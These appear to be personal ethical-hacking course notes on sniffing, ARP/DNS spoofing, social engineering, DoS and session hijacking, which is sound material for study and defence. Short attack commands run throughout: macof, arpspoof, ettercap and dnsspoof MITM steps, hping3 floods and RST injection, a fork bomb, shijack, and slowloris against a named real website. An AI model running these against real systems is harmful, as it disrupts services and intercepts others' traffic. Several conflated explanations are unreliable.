Hub usage is out-dated today. Most modern networks use switches.
-Active Sniffing
Active sniffing is used to sniff a switch-based network
The attacker forces a switch to act like a hub
Active sniffing involves injecting address resolution packets(ARP) into the network to flood the switch's Content Addressable Memory(CAM) table, CAM keeps track of which host is connected to which port
iv)Hardware protocol Analyser
A hardware protocol analyzer is a piece of equipment that captures signals without altering the traffic in a cable segment
It can be used to monitor network usage and identify malicious network traffic generated by hacking software installed in the network.
it captures a data packet, decodes it and analyzes its content according to certain predetermined rules.
v) Wire Tapping
Wiretapping is the process of monitoring telephone and Internet conversations by a third party.
Attackers connect a listening device(hardware/software) ti the circuit carrying information between two phones or hosts on the internet.
It allows an attacker to monitor, intercept, access and record information contained in a data flow in a communication system.
-Wiretapping Case Study: PRISM
 PRISM stands for "Planning Tool for Resource Integration, Synchronization, and Management", and is a "data tool" designed to collect and process "foreign intelligence" that passes through American servers.
NSA writetaps a huge amount of foreign internet traffic that is routed through or saved on US servers.
vi) MAC Flooding
MAC Address/CAM Table
 Each switch has a fixed size dynamic Content Addressable Memory(CAM) table.
 The CAM table stores information such as MAC Addresses available on physical ports with their association VLAN parameters.
-What happens when CAM Table is Full?
Once the CAM table in the switch is full, additional ARP request traffic will flood every port on the switch.
This will change the behavior of the switch to reset to it's learning mode or fail open mode, broadcasting on every port similar to a hub
This attack will also fill the CAM tables of adjaccnt switchs.
-MAC Flooding
 MAC flooding involves flooding of CAM table with fake MAC address and IP pairs until it is full.
 Switch then acts as a hub by broadcasting packets to all machines on the network and attackers can sniff the traffic easily.
vii)Switch Port Stealing
Switch Port Stealing technique uses MAC flooding to sniff the packets.
Attacker floods the switch with forged gratuitous ARP packets with target MAC address as source and his own MAC address as destination.
A race condition of attacker's flooded packets and target host packets will occur and thus switch has to change his MAC addrress binding constantly between two different ports.
viii)MAC Flooding with macof
macof -i eth0 -n 10000
ix)Working with DHCP and DHCP Starvation Attack
DHCP servers maintain TCP/IP configuration information in a database such as valid TCP/IP configuration parameters, valid IP addresses, and duration of the lease offered by the server.
It provides address configurations to DHCP-enabled clients in the form of a lease offer
Client broadcasts DHCPDISCOVER/SOLICIT request asking for DHCP Configuration Information
DHCP-relay agent captures the client request and unicasts it to the DHCP servers available in the network.
DHCP server unicasts DHCPOFFER/ADVERTISE, which contains client and server's MAC address.
-Working of DHCP server
Relay agent broadcasts DHCPOFFER/ADVERTISE in the client's subnet.
Client broadcasts DHCPREQUEST/REQUEST asking DHCP server to provide the DHCP configuration information.
DHCP server sends unicast DHCPACK/REPLAY message to the client with the IP config and information.
-DHCP Starvation Attack
This ia a denial-of-service(DoS) attack on the DHCP servers where attacker broadcasts forged DHCP requests and tries to lease all of the DHCP addresses in the DHCP scope.
In a DHCP starvation attack, the attacker sends a large number of DHCP requests to the server, typically using a spoofed MAC address, to exhaust the supply of available IP addresses. As a result, legitimate devices on the network may not be able to obtain an IP address, causing them to be unable to connect to the network.
x) Rogue(fake) DHCP Server Attack
Attacker sets rogue DHCP server in the network and responds to DHCP requests with bogus IP addresses; this results in compromised network access.
For example, an attacker might set up a rogue DHCP server that provides the IP address of a fake gateway, so that all traffic from devices on the network is routed through the attacker's machine.
xi) DHCP Starvation and Rogue Server Attacks in action
  As mentioned before, a DHCP server has a limited range of IP addresses it can allocate. A DHCP starvation attack is when a threat actor sends a massive amount of fake DISCOVER packets with spoofed MAC addresses as the source, overwhelming the DHCP server. The DHCP server responds to each of these fake DISCOVER packets until it runs out of IP addresses to allocate. This denies any valid clients from obtaining an IP address, which in turn denies them service. This is commonly known as a denial of service (DoS) attack. This may cause clients on the network to look for an alternative DHCP server. While this would be an attack on its own, this is commonly followed up by the threat actor providing their own malicious DHCP server to issue IP addresses. In addition to IP addresses, the threat actor would be able to issue default DNS and gateway information. Now, clients who use those IP addresses as well as the gateway can be routed through the threat actor’s machine, allowing them to read all of the traffic that the client sends and receives. This is what is known as a man-in-the-middle (MITM) attack.
xii) ARP Spoofing
Address Resolution Protocol(ARP) is a stateless protocol used for resolving IP addresses to machine(MAC) addresses.
All network devices(that needs to communicate on the network) broadcasts ARP quries in the network to find out other machine's MAC addresses.
When one machine needs to communicate with another, it looks up its ARP table.If MAC address is not found in the table, the ARP_REQUEST is broadcasted over the network.
All machine on the network will compare this IP address to their MAC address.
-ARP Spoofing
ARP Spoofing involves constructing a large number of forged ARP request and reply packets to overload a switch.
Switch is set in "forwarding mode" after ARP table is flooded with spoofed ARP replies and attackers can sniff all the network packets.
Attackers flood a target computer's ARP cache with forged entries, which is also known as poisoning.
xiii) ARP Spoofing with arpspoof
this command say Iam(192.168.75.2) default geteway arpspoof -i eth0 -t 192.168.75.129(target) 192.168.75.2(target gateway)
xiv) ARP Poisoning with Ettercap
sudo ettercap -G
find host on a network
set target1(victim) and target2(gateway)
start mitm attack
start sniffing
xv)MAC Spoofing
MAC duplicating attack is launched by sniffing a network for MAC addresses of clients who are actively associated with a switch port and re-using one of those addresses.
By listening to the traffic on the network, a malicious user can intercept and use a legitimate user MAC address to receive all the traffic destined for the user.
This allows an attacker to gain access to the network and take over someone identity already on the network.
xvi)MAC Spoofing with macchanger
MAC Changer is an utility that makes the maniputation of MAC addresses of network interfaces easier.
macchanger -e eth0 (e=don't change the vendor type)
macchanger -s eth0 (s=show mac addr)
xvii)IRDP Spoofing
IRDP is a protocol used by network devices to discover routers on the local network segment. When a device is turned on, it sends an IRDP message to the local network segment to discover the routers available on the network. The routers respond with their IP address, and the device selects the router with the best metric to use for routing traffic.

In an IRDP spoofing attack, an attacker sends false IRDP messages with a lower metric value to make the device choose the attacker's router instead of the legitimate router. This way, the attacker can intercept and redirect traffic to their own devices, allowing them to eavesdrop, modify or steal sensitive information, or launch further attacks.
xviii)DNS Spoofing
DNS Poisoning is a technique that tricks a DNS server into believing that it has received authentic information when, in reality, it has not.
It allows attacker to replace IP address entries for a target site on a given DNS server with fake IP address of the server he/she controls.
Attacker can create fake DNS entries for the server with same names as that of the target server.
-Intranet DNS spoofing
-Internet DNS spoofing
xix) DNS Cache Poisoning
DNS cache poisoning refers to altering or adding forged DNS records into the DNS resolver cache so that DNS query is redirected to a malicious site.
If the DNS resolver cannot validate that the DNS responses have come from an authoritative source, it will cache the incorrect entries locally and serve them to users who make the same request.
xx)DNS Spoofing with dnsspoof
make dns.conf file and contant is "172.22.52.221 *" so whatever victim type as http://*.com he is redirected on 172.22.52.221:
sudo service apache2 start (Then we can able to visit 172.22.52.221 in which our http://172.22.52.221/index.nginx-debian.html)
(var/www/html/index.nginx-debian.html)
arpspoof -i eth0 -t 192.168.75.249  192.168.75.2
arpspoof -i eth0 -t 192.168.75.2  192.168.75.249
dnsspoof -i eth0 -f dns.conf
xxi)DNS Spoofing with Ettercap
sudo nano /etc/ettercap/etter.dns
sudo nano /etc/ettercap/etter.conf
sudo ettercap -G
set target1 and target2
load dns spoofing plugin
and visit
xxii)Proxy DNS Poisoning
Attacker sends a Trojan to victim machine that changes her proxy server settings in Internet Explorer to that of the attacker's and redirects to fake website.
xxiii)Introduction to Wireshark and Walkthrough
xxiv)Wireshark Capturing Sensitive Data and Other Uses
xxv)Sniffing Detection
you need to check which machines are running in the promiscuous mode
Run IDS and notice if the mac Address of certain machines has changed (router MAC Address)
Run network tools such as Capsa Network Analyzer to monitor the network for strange packets.
-ARP method
Only a machine in promiscuous mode(machine C) caches the ARP information (IP and MAC address mapping)
A machine in promiscuous mode replies to the ping message as it has correct information about the host sending ping request in its cache; rest of the machines will send ARP probe to identify the source of ping request.
nmap --script=sniffer-detect $IP
xxvi)ARP Spoofing Countermeasures
xxvii)DNS Spoofing Countermeasures
xxviii) Sniffing Spoofing Countermeasures

#Social Engineering
i)Introduction to Social Engineering
Human Stupidity is the biggest vulnerability
Social engineering is the art of convincing people to  reveal confidential information. Common targets of social engineering include help desk personnel, technical support executives, system administrators, etc.
ii)Behaviours Vulnerable to  SE Attacks
-Factors that make Companies vulnerable to attack
Insufficient Security Traning
Unregulated Access to the Information
Several Organizational Units
Lack of Security Policies
iii)Why SE(Social engineering) is so Effective
Security policices are as strong as their weakest link, and humans are most susceptible factor.
It is difficult to detect social engineering attempts.
There is no method to ensure complete security from social engineering attacks.
There is no specific software or hardware for defending against a social engineering attack.
iv)Phases in an SE Attack
-Research on Target Company: Dumpster diving, websites, employees, tour company, etc
-Select Victim: Identify the frustrated employees of the target company.
-Develop Relationship: Develop relationship with the selected employees.
-Exploit the Relationship: Collect sensitive account anf financial information, and current technologies.
v)Types of SE, Human Based SE
Human-based Social Engineering: Gathers sensitive information by interaction.
Computer-based Social Engineering: Social engineering is carried out with the help of computers.
Mobile-based Social Engineering: It is carried out with the help of mobile applications.
-Eavesdropping or unauthorizes listening of conversations or reading of messages.
Interception of audio, video or written communication
-Dumpster Diving
Dumpster diving is looking for treasure in someone else's trash.
vi)Reverse SE and Piggybacking
A situation in which an attacker presents himself as an authority and the target seeks his advice offering the information that he needs.
Reverse social engineering attack involves sabotage, marketing, and tech support.
-Piggybacking
An unauthorized person, wearing a fake ID badge, enters a aecured area by closely following an authorized person through a door requiring key access.
vii)Computer Based Social Engineering
Check if your email or phone is in a data breach: https://haveibeenpwned.com/
Pop-up Windows
Hoax Letters: Hoax letters are emails that issue warnings to the user on new virus
Chain LettersChain letters are emails that offer free gifts such as money
Spam Email
viii)Phishing and Spear Phishing
An illegitimate email falsely claming to be from a legitimate site attempts to acquire the user's personal or account information.
Phishing emails or pop-ups redirect users to fake webpages of mimicking trustworthy sites that ask them to sumit their personal information.
-Spear Phishing
Spear phishing is a direct, targeted phishing attack aimed at specific individuals within an organization
Spear phishing generates higher response rate when compared to normal phishing attack.
ix)Mobile Based Social Engineering
Attackers create malicious apps with attractive features and similar names to that of popular apps, and publish them on major app stores.
Unware users download these apps and get infected by malware that sends credentials to attackers.
x)Insider Attack
-Spying
If a competitor wants to cause damage to your organization, steal critical secrets, or put you out of business, they just have to find a job opening, prepare someone to pass the interview, have that person hired, and they will be in the organization.
-Disgruntled Employee
An employee may become disgruntled towards the company when he/she is disrespected, frustrated with their job, having conflicts with the management, not satisfied with employment benefits, issued an employment termination notice, transferred, demoted, etc.
xi)Impersonation on Social Media
Malicious users gather confidential information from social networking sites and create accounts in others names.
Attackers use others profiles to create large networks of friends and extract information using social engineering technique.
Attacker try to join the target organization employee groups where they share personal and company information.
Attackers can also use collected information to carry out other forms of social engineering attacks.
xii)Identity Theft
Identity theft occurs when someone steals your personally identifiable information for fraudulent purposes.
It is a crime in which an imposter obtains personal identifying information such as name, credit card number, social security or driver license numbers, etc to commit fraud or other crimes.
xiii)Manual Example of Phishing
copy source code of facebook.com
xiv)Social Engineering with setoolkit
The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. SET has a number of custom attack vectors that allow you to make a believable attack quickly.
git clone https://github.com/trustedsec/social-engineer-toolkit.git
cd social-engineer-toolkit
./setoolkit
1
2
3
2
xv)Common SE Attacks and Defences
xvi)Phishtank and Netcraft
The Netcraft Extension is a tool allowing easy lookup of information relating to the sites you visit and providing protection from phishing and malicious JavaScript.
xvii)Social Engineering Countermeasures

#Denial of Services
i)Introduction to Denial of Service
Denial of Services(DoS) is an attack on a computer or network that reduces, restricts or prevents accessibility of system resources to its legitimate users.
ii)DoS DDoS Attack Techniques
-Volumetric Attacks:Consumes the bandwidth of target network or service.
-Fragmentation Attacks:Overwhelms target's ability of re-assembling the fragmented packets.
-TCP State-Exhaustion Attacks: Consumes the connection state tables present in the network infrastructure such as load-balancers, firewalls, and application servers.
-Application Layer Attacks: Consumes the application resources or service thereby making unavailable to other legitimate users.
-Bandwidth Attacks:When a DDoS attack is launched, flooding a network, it can cause network equipment such as switches and routers to be overwhelmed due to the significant statistical change in the network traffic.
-Service Request Floods: An attacker or group of zombies attempts to exhaust server resources by setting up and tearing down TCP connections. Service request flood attacks flood servers with a high rate of connections from a valid source.
iii)SYN Flooding(SlowLoris)
The attacker sends a large number of SYN request to target server(victim) with fake source IP addresses.
The target machine sends back a SYN/ACK in response to the request and waits for the ACK to complete the session setup.
The target machine does not get response because the source address is fake.
iv)ICMP Flood
ICMP flood attack is a type DoS attack in which perpetrators send a large number of ICMP packets directly or through reflection networks to victims causing it to be overwhelmed and subsequently stop responding to legitimate TCP/IP requests.
To protect against ICMP flood, set a threshold limit that when exceeds invokes the ICMP flood attack protection feature.
v)Ping of Death
The attacker aims to disrupt a targeted machine by sending a packet larget than the maximum allowable size, causing the target machine to freeze or crash.
IP4 ping packets are much larger, and can be as large as the maximum allowable packet size of 65,535 bytes. Some TCP/IP systems were never designed to handle packets larger than the maximum, making them vulnerable to packets above that size.
vi)Teardrop Attack
-Targets TCP/IP reassembly mechanisms, preventing them from putting together fragmented data packets. As a result, the data packets overlap and quickly overwhelm the victim's servers, causing them to fail.
-Since the machine receiving such packets cannot reassemble them due to a bug in TCP/IP fragmentation reassembly, the packets overlap one another, crashing the target network device.
-Teardrop attacks are a result of an OS vulnerability common in older versions of Windows, including 3.1, 95 and NT, resurfaced in Windows 7 and Vista.
vii)Smurf Attack
-Distributed denial-of-service attack in which large numbers of (ICMP) packets with the intended victim's spoofed source IP are broadcast to a computer network using an IP broadcast address.
-The response from all the machines will be reflected towards to the victim's machine in exceptionally large numbers, causing it to freeze or hang(multiplied upto 255 times).
viii)Peer to peer and Permanent DoS
-Using peer-to-peer attacks, attackers instruct clients of peer-topeer file sharing hubs to disconnect from their peer-to-peer network and to connect to the victim's fake website.
-Attackers exploit flaws found in the network usinf DC++(Direct Current) protocol, that is used for sharing all types of files between instant messagng clients.
-permanent Denial-of-Service(pDoS) Attack
 Phlashing: Permanent DoS, also known as phlashing, refers to attacks that cause irreversible damage to system hardware.
 Sabotage: Unlike other DoS attacks, it sabotage the system hardware, requiring the victim to replace or reinstall the hardware.
ix) Application Level Denial of Service
Application-level flood attacks result in the loss of services of a particular network, such as emails, network resources, the temporary ceasing of applications and services, and more.
Using this attack, attackers exploit weakness in programming source code to prevent the application from processing legitimate requests.
-Using application-level flood attacks, attackers attempts to:
Flood web applications to legitimate user traffic
Blocking a user access by repeating invalid login attempts.
x) Slowloris
Slowloris is a denial-of-service attack program which allows an attacker to overwhelm a targeted server by opening and maintaining many simultaneous HTTP connections between the attacker and the target.
When the server's maximum possible connections has been exceeded, each additional connection will not be answered and denial-of-service will occur.
-A Slowloris attack occurs in 4 steps:
The attacker first opens multiple connections to the targeted derver by sending multiple partial HTTP request headers.
The target opens a thread for each incoming request.
To prevent the target from timing out the connections, the attacker periodically sends partial request headers to the target in order to keep the request alive. In essence saying, Iam still here Iam just slow, please wait for me.
The targeted server is never able to release any of the open partial connections while waiting for the termination of the request. Once all available threads are in use, the server will be unable to respond to additional requests made from regular traffic, resulting in denial-of-service.
xi)RAM attack
-Recursion
It refers to a procedure that causes itself to repeat over and over again.
In most cases, this is a controlled process and a valid technique in programming.
In the case of L7DoS, it's the result of a small set of instructions whose execution prompts vulnerable applications to enter a resource-intensive loop, with the specific purpose of exhausting their resources.
-Zip bombs(when we upload zip file in webapplication it then extract in infinity loop then Zipb bomb attack happen)
In the early 2000s, ZIP bombs were emailed to unsuspecting victims in order to crash their personal computers or mail servers.
Ironically, this was often the fault of the system's antivirus program's automated extraction of the archive(in order to scan it), not that of the user opening it. Now, most antivirus vendors would either detect ZIP bombs or avoid extracting them completely.
xii)More RAM attack
-Deserialization Vulnerabilities
Deserialization is a delicate topic and you should generally not deserialize user supplied input using functions that are not explicitly recommended as safe alternative to raw deserialization functions.
It might be possible to pass a string to a deserialization function that instructs the parser to allocate large chunks of memory(for example by using repeating nested array definitions as seen in the linked paper about various PHP vulnerabilities)
-Manipulating File headers to Allocate Large Memory Chunks
Using a 260px * 260px jpg file, the researcher manipulated the file header in order to make it appear as if the image was 64250px * 64250px in size. This relatively small file eventually led to a DoS condition on HackerOne, and apparently on the researcher's local image viewer.
xiii)CPU attacks, ReDos
reDoS(Regular Expression Denial of Service) was put under the spotlight in 2016 when it caused stackoverflow.com to go offline for just over 30 minutes.
It was's the fault of an attacker, but a user who included 20,000 whitespace characters in a code snippet.
According to the write-up, the regular expression was written in such a way that it forced the system to check the 20000 character string in 200010000 steps
xiv)More CPU attacks
-SQL Injection Wildcard Attack
An SQL injection wildcard attack works in a similar way to a plain reDoS.
The key difference is that it doesn't just use the usual regular expression syntax, but employs so-called 'wildcards' that are used by dtabases to find dta matching a specific description.
These attacks can either be carried out using an (otherwise not vulnerable) search functionality, or via an attack vector, where it's possible to execute SQL statements, for example with an existing SQL injection vulnerability.

-Fork Bombs
Fork bombs are processes that duplicate themselves over and over again until use up all of the system's resources. Both the CPU and the process table are affected.
Perhaps the most commonly-known fork bomb is the following shell command: :(){:|:&};:
This shows that fork bombs use recursion as the : function calls itself over and over again. Fork bombs are rarely used in web application attacks.
-Abusing Password Hashing Functions
Modern password hashing functions are designed to be ineffective, which is achieved by so-called 'key stretching'.
They need a lot of time and resources to return the desiered output. This is intentional because it slows down attackers that are trying to find the passwords belonging to those hashes.
xv)Disk Space attacks
If the application doesn't apply proper rate-limiting and size checks for its file upload functionality, an attacker can upload random junk data to the system until it can no longer store any more data.
This either makes the file upload functionality fail for legitimate users, or can make the entire system unstable.
The deletion of arbitrary files is a completely different DoS approach.
Using an arbitrary file deletion vulnerability, an attacker can remove data that is necessary for the application in order to work correctly.
This may include removing configuration files or even script code in order to deny service legitimate users.
xvi) Exhausting Single User Service
-Email Bomb
Users are regularly allocated a small amount of space for their inbox.
The goal of an Email Bomb is to flood a user's inbox to the point where all available space is exhausted, and subsequent(Legitimate) emails bounce.
-Free Website Restrictions
Some web hosts allow only a certain amount of requests per day for users on free subscriptions. If the amount of requests exceeds the maximum limit, the page becomes unavailable foe a certain amount of time, except if the user pays for a subscription.
-Cash overflow
A similar approach is called Cash Overflow. Instead of targeting disk space, RAM or the CPU, the attack aims to raise the bill for a service up to the point where it exceeds the allocated amount of money.
xvii) Logical Based Denial of Service
-X-forarded-for
If the application incorrectly uses headers like X-Forwarded-For in order to determine users IP addresses.
It's easy to forget that this flawed implementation also opens the door for a DoS attack, if the IP address of a legitimate user is used instead of a random one for example.
Attackers may constantly trigger rate limiting, with an X-Forwarded-For header containing the victims IP address. If victims can't mask or change their IP address, they are denied service for the duration of the attack.
xviii)Introduction to Botnets
-Botnets
Bots are software applications that run automated tasks over the Internet and perform simple repetitive tasks, such as web spidering and search engine indexing.
A botnet is a huge network of the compromised systems and can be used by an attacker to launch denial-of-service.
xix) More on Botsnets
-Scanning methods for finding vulnerable machine
Random Scanning: The infected machine probes IP addresses randomly from target network IP range and checks for the vulnerability.
Hit-list Scanning: Attacker first collects list of possible potentially vulnerable machines and then perform scanning to find vulnerable machine.
Topological Scanning: It uses the information obtained on infected machine to find new vulnerable machine.
Local Subnet Scanning: The infected machine looks for the new vulnerable machine in its own local network.
Permutation Scanning: It uses pseudorandom permutation list of IP addresses to find new vulnerable machines.
-How Malicious Code propagates?
Central Source Propagation
Back-chaning Propagation
Autonomous Propagation
xx)ICMP Flood with hping3
sudo hping3 -1 --flood -c 10000  192.168.1.254
open wireshark
ping 192.168.1.254
xxi)SYN Flood with hping3
sudo hping3 -d 200 -c 10000 -S 192.168.1.254 --flood
open wireshark
ping  192.168.1.254
xxii)Low Orbit Ion Cannon(Automatic tool for flooding tcp, udp, http request)
Low Orbit Ion Cannon (LOIC) is a widely available, open-source application developed by Praetox Technologies used for network stress testing, as well as distributed denial of service (DDoS) attacks.
xxiii)Ping of Death in action
The ping of death attack is a type of cyber attack that involves sending an unusually large and malformed ping packet (a network packet used to test the connectivity between two devices) to a target system. The intention is to overwhelm the target system with data, causing it to crash or become unusable.
The attack takes advantage of a vulnerability in the way that some systems handle fragmented IP packets.
ping google.com -l 65500 -w 1 -n 100
ping -n google.com
xxiv)Slowloris attack
Slowloris is an application layer DDoS attack which uses partial HTTP requests to open connections between a single computer and a targeted Web server, then keeping those connections open for as long as possible, thus overwhelming and slowing down the target
slowloris -s 500 -p 443 miro.com
xxv)R U Death Yet
 R.U.D.Y. is a denial-of-service attack tool that aims to keep a web server tied up by submitting form data at an absurdly slow pace.
git clone https://github.com/sahilchaddha/rudyjs.git
rudy --target http://192.168.1.5 -n 500 -m "GET"
xxvi)Dos DDoS attack Detection
-Detection Techniques
Detection techniques are based on identifying and discriminating the illegitimate traffic increase and flash events from legitimate packet traffic.
All Detection techniques define an attack as an abnormal and noticeable deviation from a threshold of normal network traffic statistis.
-Activity Profiling
An attack is indicated by:
   An increase in activity levels among the network flow clusters.
   An increase in the overall number of distinct clusters(DDoS attack)
Activity profile is done based on the average packet rate for a network flow, which consists of consecutive packets with similar packet fields.
Activity profile is obtained by monitoring the network packet's header information.
-Wavelet-based Signal Analysis
Wavelet analysis describes an input signal in terms of spectral components.
-Changepoint Detection
Change-point detection algorithms isolate changes in network traffic statistics caused by attacks.
xxvii)DoS Countermeasures 1
Absorbing the attack
  Use additional capacity to absorb attack; it requires preplanning
  It requires additional resources.
Degrading Services:
  Identify critical services and stop non critical services.
Shutting Down the Services:
  Shut down all the services until the ttack has subsided.
-Protect Secondary Victims
 Install anti-virus and anti-Trojan software and keep these up-to-date
 Increase awareness of security issues and prevention techniques in all Internet users.
-Detect and Neutralize Handlers
Network Traffic Analysis
Neutralize Botnet Handlers
Spoofed Source Address
xxviii)DoS Countermeasures 2
-Detect Potential Attacks
Egress Filtering: Scanning the packet headers of IP packets leaving a network. Egress filtering ensures that unauthorized or malicious traffic never leaves the internal network.
Ingress Filtering: Protects from flooding attacks which originate from the prefixes(IP address). It enables the originator to be traced to its true source.
TCP Intercept: Configuring TCP Intercept prevents DoS attacks by intercepting and validating the TCP connection requests.
-Deflect Attacks
Systems that are set up with limited security, also known as Honeypots, act as an enticement for an attacker.
Honeypots serve as a means for gaining information about attackers, attack techniques and tools by storing a record of the system ativities.
-Load Balancing:
Increase bandwidth on critical connections to absorb additional traffic generated by an attack.
Replicate servers to provide additional failsafe protection.
Balance load on each server in a multiple-server architecture to mitigates DDoS attack.
-Throttling(Rate limiting):
Set routers to access a server with a logical to throttle incoming traffic levels that are safe for the server.
Throttling helps in preventing damage to servers by controlling the DoS traffic.
-Drop Request: Drop packets when a load increases.
xxix)DoS Countermeasures 3
-Post-Attack Forensics
DDoS attack traffic patterns can help the network administrators to develop new filtering techniques for preventing the attack traffic from entering or leaving the networks.
Analyze router, firewall, and IDS logs to identify the source of the DoS traffic. Try to trace back attacker IP with the help of intermediary ISPs and law enforcement agencies.
Traffic pattern analysis: Data can be analyzed - post attack - to look for specific characteristics within the attacking traffic.
-Techniques to Defend against Botnets
RFC 3704 Filtering: Any traffic coming from unused or reserved IP addresses is bogus and should be filtered at the ISP before it enters the Internet Link.
-Cisco IPS Source IP Reputation Filtering: Reputation services help in determining if an IP or service is a source of threat or not, Cisco IPS regularly updates its database with known threads such botsnets, botnet harvester, malwares etc and helps in filtering DoS traffic.
-Black Hole Filtering:
Black hole refers to network nodes where incoming traffic is discarded or dropped without informing the source that the data did not reach it intended recipient
Black hole filtering refers to iscarding packets at the routing level.
-DDoS Prevention Offerings from ISP or DDoS Service.
-DoS/DDoS Countermeasures
Use strong encryption mechanisms such as WPA2, AES 256 etc for broadband networks to withstand against eavesdropping.s
Disable unused and insecure services.
Update kernal to the latest release.

#Session Hijacking
i)Introduction to Session Hijacking
Session hijacking refers to an attack where an attacker takes over a valid TCP communication session between two computers.
Since most authentication only occurs at the start of a TCP session, this allows the attacker to gain access to a machine.
Attackers can sniff all the traffic from the established TCP sessions and perform identity theft, information theft, fraud etc
The attacker steals a valid session ID and use it to authenticate himself with the server.
No account lockout for invalid session IDs
Weak session ID generation algorithm or small session IDs
Insecuring handling of session IDs
  DNS poisoning, XSS, exploiting a bug in browser
Indefinite session expiration time
Most computers using TCP/IP are vulnerable
Most countermeasures do not work unless you use encryption.
ii) Session Hijacking Process
Stealing:The attacker uses different techniques to steal session IDs
Some of the techniques used to steal session IDs:
    Using the HTTP referrer header
    Sniffing the network traffic
    Using the cross-site-scripting attacks
    Sending Trojans on client machines
Guessing:
The attacker tries to guess the session IDs by obserbing variable parts of the session IDs.
   http://www.hacksite.com/view/VW212
   http://www.hacksite.com/view/VW213
   http://www.hacksite.com/view/VW214
Brute Forcing: The attacker attempts different ISs until he succeeds.
   Using brute force attacks, an attacker tries to guess a session ID until he finds the correct ID.
Command Injection: Start injecting packets to the target server
Session ID prediction: Take over the session
Session Desynchronization: Break the connection to the victim machine by predicting the sequence number
Monitor: Monitor the flow of packets and predict the sequence number
Sniff: Place yourself  between the victim and the target
iii) Packet Analysis of a Local Session Hijack
Acording to the diagram, the next expected sequence number would be 1420. If you can transmit that packet sequence number before the user does, you can desynchronize the connection between the user and the server.
After establishing the connection between the attacker and the server, though the user sends the data with the correct sequence number, the server drops the data considering it as a resent packet.
iv) Types of Session Hijacking
Active Attack: In an active attack, an attacker finds an active session and takes over.
passive attack: With a passive attack, an attacker hijacks a session but sits back and watches and records all the traffic that is being sent forth.
Network Level Hijacking: Network level hijacking can be defined as the interception of the packets during the transmission between the client and the server in a TCP and UDP session.
Application level Hijacking: Application level hijacking is about gaining control over HTTP's user session by obtaining the session IDs.
v) Spoofing vs Hijacking
-Spoofing Attack:
Attack pretends to be another user or machine(victim) to gain access.
Attacker does not take over an existing active session. Instead he initiates a new session using the victim stolen credentials
-Hijacking:
Session hijacking is the process of taking over an existing active session
Attacker relies on the legitimate user to make a connection and authenticate.
vi) Application Level Session Hijacking
vii)Application level Session Sniffing and Predicting
-Compromising Sessions IDs using Sniffing
-Compromising Sessions IDs by Predicting Session Token
viii) Application Level Session MITM and MITB
-MITM
The man-in-the-middle attack is used to intrude into an existing connection between systems and to intercept massages being exchanged.
Attacker use different techniques and split the TCP connection into two connections.
  Client-to-attacker connection
  Attacker-to-server connection
After the successful interception of TCP connection, an attacker can read, modify, and insert fraudulent data into the intercepted communication
-MITB
Man-in-the-browser attack uses a Trojan Horse to intercept the calls between the browser and its security machanisms or libraries.
In summary, while a man-in-the-middle attack involves intercepting and manipulating the communication between two parties, a man-in-the-browser attack targets the victim's browser and manipulates the web pages displayed to the victim
It works with an already installed Trojan horse and acts between the browser and its security mechanisms.
ix) Application Level Client Side Attacks
-Compromising Session IDs Using Client-side Attacks
Creoo-Site Scripting(XSS): XSS enables attackers to inject malicious client side scripts into the web pages viewed by other users.
Malicious JavaScript Codes: A malicious script can be embedded in a web page that does not generate any warning but it captures session tokens in the background and send it to the attacker.
Trojans: A Trojan horse can change the proxy settings in user's browser to send all the sessions through the attackers machine.
x) Application Session Replay Attack
In a session replay attack, the attacker listens to the conversation between the user and server and captures the authentication token of the user.
Once the authentication token is captured, the attacker replays the request to the server with the captured authentication token and gains unauthorized access to the server.
xi) Application Session Fixation
The attack tries to lure a user to authenticate himself with a known session ID and then hijacks the user-validated session by the knowledge of the used session ID.
The attacker has to provide a legitimate web application session ID and try to lure victim browser to use it.
Several techniques to execute Session Fixation attack are:
  Session token in the URL argument
  Session token in a hidden form field
  Session ID in a cookie
xii) Network Level Session Hijacking
The network-level hijacking relies on hacking transport and Internet protocols used by web application layer
Attacker gathers some critical information used to attack application level.
Network-level hijacking includes:
  Blind Hijacking
  TCP/IP Hijacking, UDP Hijacking
  RST Hijacking
  Man-in-the-Middle: Packet Sniffer
  IP Spoofing: Source Routed Packets
-The 3-Way Handshake
  If the attacker can anticipate the next sequence and ACK number that Bob will send, he/she will spoof Bob's address and start a communication with the server.
xiii) Network Level TCP Hijacking
Attacker sniffs the victim's connection and uses the victim IP to send a spoofed packet with the predicated number
The receiver processes the spoffed packet, increments the sequence number and sends acknowledgement to the victim IP
The victim machine is unware of the spoofed packet. so it ignores the receiver machine ACK packet and turns sequence  number count off.
Therefore, the receiver receives packets with the incorrect sequence number.

In summary, session hijacking involves intercepting and taking control of an established session between two parties, while TCP hijacking involves spoofing the identity of one party in a TCP connection to take control of the connection.
xiv) Network Level IP Spoofing
Packet source routing technique is used for gaining unauthorized access to a computer with the help of a trusted host IP address
The attackers spoofs the host's IP address so that the server managing a session with the host, accepts the packets from the attacker
When the session is established, the attacker injects forged packets before the host responds to the server
The original packet from the host is lost as the server gets the packet with a sequence number already used by the attacker.
The packets are source-routed where the path to the destination IP can be specified by the attacker.
xv) Network Level RST Hijacking
RST hijacking involves injecting an authentic-looking reset(RST) packet using spoofed address and predicting the acknowledgment number.
The hacker can reset the victim connection if it uses an accurate acknowledgment number.
The victim believes that the source actually sent the reset packet and resets the connection.
RST Hijacking can be carried out using a packet crafting tool such as Colasoft's Packet Builder and TCP/IP analysis tool such as tcpdump.
xvi) Blind Hijacking
The attacker can inject the malicious data or commands into the intercepted communications in TCP session even if the source-routing is disabled.
The attacker can send the data or commands but has no access to see the response.
xvii) Network level UDP Hijacking:
A network-level session hijacking where the attacker sends forged server reply to a victim's UDP request before the intended server replies to it.
The  attacker uses man-in-the-middle attack to intercept server response to the client and sends its forged reply.
xviii)TCP Hijacking with Shijack
Shijack is a TCP connection hijacking tool for Linux.
./shijack-lnx eth0 192.168.1.6(victim) 50383(port) 192.168.1.5 23
./wireshark
xix) Session Prediction in action
http://192.168.30.129/WebGoat/attack?Screen=73&menu=1800
webgoat(7 char): 65432ubphcfx
aspect(6 char): 65432udfqtb
xx) RST Hijacking with hping3
hping3 192.168.1.5 -s 50574 -p 23 -a 192.168.1.6 -R -A -M 1108279832(seq) -L 4065742143(ack)
xxi) Session MITM in action
xxii) Session Fixation in action
http://192.168.30.129/WebGoat/attack?Screen=56&menu=1800&SID=sessionforjane
xxiii) Application Level Session Brute Forcer
http://192.168.30.129/WebGoat/attack?Screen=72&menu=1800
xxiv) Session Hijacking Countermeasures 1
-Detection Method
  Manual method
    Using Packet Sniffing Software
